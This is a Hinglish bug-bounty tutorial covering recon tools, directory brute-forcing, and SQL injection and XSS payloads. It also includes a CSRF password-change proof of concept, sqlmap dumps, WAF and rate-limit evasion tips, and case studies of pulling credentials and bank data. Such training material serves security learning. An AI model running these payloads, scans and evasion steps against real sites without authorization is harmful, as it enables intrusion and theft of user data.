# 🔥 Complete Bug Hunting Hinglish Guidebook 🔥
## Beginner se Elite tak ka Complete Journey

---

# 📚 Table of Contents / Index

## 🎯 Part 1: Introduction & Basics
- [Bug Hunting kya hai?](#bug-hunting-kya-hai)
- [Beginner se Elite Journey](#beginner-se-elite-journey)
- [Tools Setup](#tools-setup)

## 🛠️ Part 2: Complete Workflow
- [Reconnaissance Phase](#reconnaissance-phase)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Exploitation Techniques](#exploitation-techniques)
- [Advanced Methods](#advanced-methods)

## 💡 Part 3: Practical Examples
- [Real Case Studies](#real-case-studies)
- [Command Examples](#command-examples)
- [Troubleshooting](#troubleshooting)

## 🚀 Part 4: Quick Reference
- [Command Cheat Sheet](#command-cheat-sheet)
- [Tools Reference](#tools-reference)
- [Tips & Tricks](#tips-tricks)

---

# 🎯 Bug Hunting kya hai?

Dost, bug hunting matlab hai websites aur applications mein security vulnerabilities dhundna. Ye ek art hai jo patience, skills aur right tools ke saath seekhi jaati hai.

## Beginner se Elite Journey

### 🌱 Beginner Level (0-3 months)
- Basic web technologies samjho
- Common vulnerabilities ke baare mein padho
- Simple tools use karna seekho

### 🌿 Intermediate Level (3-12 months)
- Advanced scanning techniques
- Manual testing skills develop karo
- Automation scripts likhna seekho

### 🌳 Advanced Level (1-2 years)
- Custom exploits banao
- Zero-day vulnerabilities dhundo
- Bug bounty programs mein participate karo

### 🏆 Elite Level (2+ years)
- Research new attack vectors
- Contribute to security community
- Mentor other bug hunters

---

# 🛠️ Tools Setup

## Essential Tools List

### Reconnaissance Tools
```bash
# Subdomain enumeration
sudo apt install subfinder
sudo apt install assetfinder
sudo apt install amass

# Port scanning
sudo apt install nmap
sudo apt install masscan

# Web crawling
sudo apt install gospider
sudo apt install hakrawler
```

### Vulnerability Scanners
```bash
# Web application scanners
sudo apt install nikto
sudo apt install dirb
sudo apt install gobuster

# Custom tools
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

---

# 🔍 Complete Bug Hunting Workflow

## Phase 1: Reconnaissance (Recon)

### Subdomain Discovery
```bash
# Multiple tools use karo better results ke liye
subfinder -d target.com -o subdomains.txt
assetfinder --subs-only target.com >> subdomains.txt
amass enum -d target.com -o amass_results.txt

# Combine aur unique karo
cat subdomains.txt amass_results.txt | sort -u > final_subdomains.txt
```

### Port Scanning
```bash
# Fast scan pehle
nmap -T4 -F target.com

# Detailed scan important ports pe
nmap -sC -sV -p- target.com -oN detailed_scan.txt

# Masscan for large ranges
masscan -p1-65535 target.com --rate=1000
```

### Web Technology Detection
```bash
# Check karo kya technology use kar rahe hain
whatweb target.com
httpx -l subdomains.txt -tech-detect -o tech_results.txt
```

## Phase 2: Vulnerability Assessment

### Directory Bruteforcing
```bash
# Common directories dhundo
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Specific extensions ke saath
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt

# Recursive scanning
dirb https://target.com /usr/share/wordlists/dirb/common.txt -r
```

### Parameter Discovery
```bash
# Hidden parameters dhundo
arjun -u https://target.com/page.php
paramspider -d target.com -o params.txt
```

### Vulnerability Scanning
```bash
# Nuclei templates use karo
nuclei -l subdomains.txt -t /root/nuclei-templates/

# Specific vulnerability types
nuclei -l subdomains.txt -t /root/nuclei-templates/cves/
nuclei -l subdomains.txt -t /root/nuclei-templates/vulnerabilities/
```

## Phase 3: Manual Testing

### SQL Injection Testing
```bash
# Basic payloads
' OR 1=1--
' UNION SELECT 1,2,3--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

# SQLMap use karo
sqlmap -u "https://target.com/page.php?id=1" --dbs
sqlmap -u "https://target.com/page.php?id=1" -D database_name --tables
```

### XSS Testing
```bash
# Basic payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

# XSStrike tool
python3 xsstrike.py -u "https://target.com/search?q=test"
```

### CSRF Testing
```html
<!-- CSRF PoC -->
<html>
<body>
<form action="https://target.com/change-password" method="POST">
<input type="hidden" name="new_password" value="hacked123">
<input type="submit" value="Click Me">
</form>
</body>
</html>
```

---

# 💡 Real Case Studies

## Case Study 1: E-commerce Website

### Target: online-shop.com

**Step 1: Reconnaissance**
```bash
# Subdomains nikale
subfinder -d online-shop.com -o subs.txt
# Result: admin.online-shop.com, api.online-shop.com, dev.online-shop.com
```

**Step 2: Technology Detection**
```bash
whatweb online-shop.com
# Result: PHP 7.4, MySQL, Apache 2.4
```

**Step 3: Directory Bruteforcing**
```bash
gobuster dir -u https://online-shop.com -w /usr/share/wordlists/dirb/common.txt
# Found: /admin, /backup, /config
```

**Step 4: Vulnerability Found**
- `/backup` directory mein database backup file mili
- Credentials extract kiye
- Admin panel access kar liya

**Impact**: Complete database access, customer data compromise

## Case Study 2: Banking Application

### Target: secure-bank.com

**Step 1: Parameter Discovery**
```bash
arjun -u https://secure-bank.com/transfer.php
# Found hidden parameter: debug=1
```

**Step 2: Information Disclosure**
```bash
curl "https://secure-bank.com/transfer.php?debug=1"
# Response mein database queries visible ho gayi
```

**Step 3: SQL Injection**
```bash
sqlmap -u "https://secure-bank.com/transfer.php?account_id=1" --dbs
# Successfully extracted user data
```

**Impact**: Sensitive financial data exposure

---

# 🚀 Quick Reference Cards

## Command Cheat Sheet

### Reconnaissance Commands
```bash
# Subdomain enumeration
subfinder -d target.com -silent | httpx -silent -o live_subs.txt

# Port scanning
nmap -sC -sV -oN scan.txt target.com

# Technology detection
httpx -l domains.txt -tech-detect -silent
```

### Vulnerability Testing
```bash
# Directory bruteforcing
gobuster dir -u https://target.com -w wordlist.txt -x php,html,js

# Parameter fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302

# SQL injection
sqlmap -u "https://target.com/page.php?id=1" --batch --dbs
```

### Automation One-liners
```bash
# Complete recon pipeline
echo "target.com" | subfinder -silent | httpx -silent | nuclei -silent

# Find XSS in parameters
echo "https://target.com" | waybackurls | gf xss | qsreplace '"><script>alert(1)</script>' | httpx -silent

# SQL injection check
echo "https://target.com" | waybackurls | gf sqli | sqlmap --batch --random-agent --level 1
```

## Tools Reference

### Essential Tools
| Tool | Purpose | Command Example |
|------|---------|-----------------|
| Subfinder | Subdomain discovery | `subfinder -d target.com` |
| Httpx | HTTP probe | `httpx -l domains.txt` |
| Nuclei | Vulnerability scanner | `nuclei -l targets.txt` |
| Gobuster | Directory bruteforce | `gobuster dir -u https://target.com -w wordlist.txt` |
| SQLMap | SQL injection | `sqlmap -u "url" --dbs` |
| Nmap | Port scanner | `nmap -sC -sV target.com` |

### Advanced Tools
| Tool | Purpose | Installation |
|------|---------|--------------|
| Amass | Asset discovery | `go install github.com/OWASP/Amass/v3/...@master` |
| Ffuf | Web fuzzer | `go install github.com/ffuf/ffuf@latest` |
| Gau | URL discovery | `go install github.com/lc/gau@latest` |
| Qsreplace | Query string replace | `go install github.com/tomnomnom/qsreplace@latest` |

---

# 🎯 Tips & Tricks

## Beginner Tips
1. **Patience rakho**: Bug hunting mein time lagta hai
2. **Notes banao**: Har step document karo
3. **Community join karo**: Discord/Telegram groups mein active raho
4. **Practice karo**: VulnHub, HackTheBox use karo

## Intermediate Tips
1. **Automation seekho**: Bash scripting aur Python use karo
2. **Multiple tools combine karo**: Better results ke liye
3. **Custom wordlists banao**: Target-specific wordlists effective hote hain
4. **Burp Suite master karo**: Professional tool hai

## Advanced Tips
1. **Source code analysis karo**: GitHub repositories check karo
2. **Mobile apps test karo**: APK reverse engineering seekho
3. **API testing focus karo**: Modern applications API-heavy hain
4. **Cloud security seekho**: AWS, Azure vulnerabilities common hain

## Elite Tips
1. **Zero-day research karo**: New vulnerabilities dhundo
2. **Custom tools banao**: Apne specific needs ke liye
3. **Methodology develop karo**: Apna unique approach banao
4. **Community contribute karo**: Tools aur knowledge share karo

---

# 🔧 Troubleshooting

## Common Issues aur Solutions

### Issue 1: Tools install nahi ho rahe
```bash
# Solution: Dependencies check karo
sudo apt update && sudo apt upgrade
sudo apt install golang-go python3-pip

# Go tools ke liye
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin
```

### Issue 2: Rate limiting aa rahi hai
```bash
# Solution: Delays add karo
gobuster dir -u https://target.com -w wordlist.txt --delay 100ms

# Multiple IPs use karo
proxychains nmap target.com
```

### Issue 3: WAF bypass karna hai
```bash
# Different user agents try karo
curl -H "User-Agent: Mozilla/5.0..." https://target.com

# Encoding use karo
echo "' OR 1=1--" | base64
# Result: JyBPUiAxPTEtLQ==
```

### Issue 4: False positives aa rahe hain
```bash
# Manual verification karo
curl -I https://target.com/admin
# Status code check karo

# Multiple tools se confirm karo
httpx -l urls.txt -status-code -title
```

---

# 📈 Progress Tracking

## Beginner Checklist
- [ ] Basic tools install kiye
- [ ] First subdomain enumerate kiya
- [ ] Directory bruteforcing ki
- [ ] Basic vulnerability scan kiya
- [ ] First bug report likha

## Intermediate Checklist
- [ ] Automation scripts banaye
- [ ] Custom wordlists create kiye
- [ ] Manual testing skills develop kiye
- [ ] Bug bounty program join kiya
- [ ] First valid bug submit kiya

## Advanced Checklist
- [ ] Advanced techniques master kiye
- [ ] Mobile app testing sikha
- [ ] API security testing kiya
- [ ] Cloud security vulnerabilities dhunde
- [ ] Community mein contribute kiya

## Elite Checklist
- [ ] Zero-day vulnerability discover kiya
- [ ] Custom tools develop kiye
- [ ] Research papers publish kiye
- [ ] Conferences mein speak kiya
- [ ] Other hunters ko mentor kiya

---

# 🎉 Conclusion

Dost, ye complete guidebook tumhe beginner se elite level tak le jaayegi. Remember:

1. **Consistent practice karo** - Daily thoda time dedicate karo
2. **Legal boundaries respect karo** - Sirf authorized targets test karo
3. **Community se jude raho** - Knowledge sharing important hai
4. **Patient raho** - Success overnight nahi aati

**Happy Bug Hunting! 🐛🔍**

---

*"The best way to learn bug hunting is by doing it. Start today, stay consistent, and never stop learning!"*

---

## 📞 Contact & Resources

### Communities
- **Discord**: Bug Bounty Community
- **Telegram**: @bugbountyhunters
- **Twitter**: Follow @bugbountyguide

### Learning Resources
- **YouTube**: Bug bounty tutorials
- **GitHub**: Tools aur scripts
- **Medium**: Technical writeups
- **HackerOne**: Bug bounty platform

### Practice Platforms
- **VulnHub**: Vulnerable VMs
- **HackTheBox**: Penetration testing
- **PortSwigger Web Security Academy**: Free web security training
- **DVWA**: Damn Vulnerable Web Application

---

*Last Updated: August 2025*
*Version: 2.0 Elite Edition*